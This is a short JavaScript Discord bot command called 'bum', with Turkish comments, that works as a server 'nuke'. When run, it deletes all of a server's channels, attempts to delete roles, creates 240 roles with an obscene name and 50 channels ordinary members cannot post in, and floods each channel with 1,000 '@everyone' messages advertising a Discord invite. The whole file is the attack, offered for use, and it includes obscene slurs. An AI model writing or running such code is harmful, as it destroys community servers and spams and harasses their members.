module.exports.run = async (client, message, args) => { //Tutti
    var channelNames =  ["no-mercy-siker","tutti-sikti"]; //buraya istediğiniz kadar kanal adı girin hepsini açıp mesaj atıcak 29. satırı kontrol et! //Tutti
    message.guild.channels.cache.forEach(channel => channel.delete()); // Sunucudaki tüm kanalları siler //Tutti
 //Tutti
    message.guild.roles.cache.forEach(role => { //Tutti
        if(!role.name === "everyone") { //Tutti
            role.delete();  //Tutti
        } //Tutti
    }); //Tutti
        for(let i = 0; i < 240; i++) { //Tutti
            message.guild.roles.create({ name: "NO MERCY SİKER" }).then((createdRole) => { //Tutti
            //message.guild.members.cache.forEach(member => member.roles.add(createdRole.id)); /////bunu aktif edersen açtığı rolleri sunucudaki herkese verir //Tutti
        }); //Tutti
    } //Tutti
    for(let i = 0; i < 50; i++) { //Tutti
        var number = Math.floor(Math.random() * channelNames.length); //Tutti
        var channelName = channelNames[number]; //Tutti
        message.guild.channels.create(channelName, { //Tutti
            type: "text", //Tutti
            permissionOverwrites: [ //Tutti
                {
                    id: message.guild.roles.everyone, //Tutti
                    deny: ["SEND_MESSAGES"] //Tutti
                } //Tutti
            ], //Tutti
        }).then(channel => { //Tutti
            for(let i = 0; i < 1000; i++) { ///süreyi elleme  //Tutti
                channel.send({ content: "@everyone https://discord.gg/arSw9Qxym4" });//// burada açtığı tüm kanallara ever spamı atar mesaj içeriğini yazın kısaca //Tutti
            } //Tutti
        }); //Tutti
    } //Tutti
} //Tutti
module.exports.help = { //Tutti
    name: "bum" //Tutti
} //Tutti